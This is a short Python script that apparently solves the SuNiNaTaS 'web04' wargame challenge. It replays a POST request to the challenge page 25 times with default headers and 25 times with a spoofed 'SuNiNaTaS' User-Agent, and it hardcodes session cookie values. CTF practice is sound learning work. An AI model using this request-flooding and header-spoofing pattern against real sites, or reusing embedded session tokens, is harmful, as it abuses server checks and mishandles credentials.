import requests as req

URL = "http://suninatas.com/challenge/web04/web04_ck.asp"
#Define Destination URL

cookies = {"ASPSESSIONIDCQCAQARC":"IBAIEAKBONBABMLEAKMEAJBF", "ASP.NET_SessionId":"r0t5uuobdpqluvd4k112cs2y", "_gid":"********", "_ga":"********"}
#Define Cookie for Login Session. The Value is Will be change when ever login

headers = req.utils.default_headers()
#Get Header Define Custom header

headers.update({'User-Agent':'SuNiNaTaS', })
#Add the Value at the header


for a in range(25):
    response = req.post(URL, cookies=cookies)
    print(response.status_code)
    print(a)
#Keep Request 25 times Use Default Headers

for a in range(25):
    response = req.post(URL, cookies=cookies, headers=headers)
    print(response.status_code)
    print(a)
#Keep Request 25 time Use Custom Headers
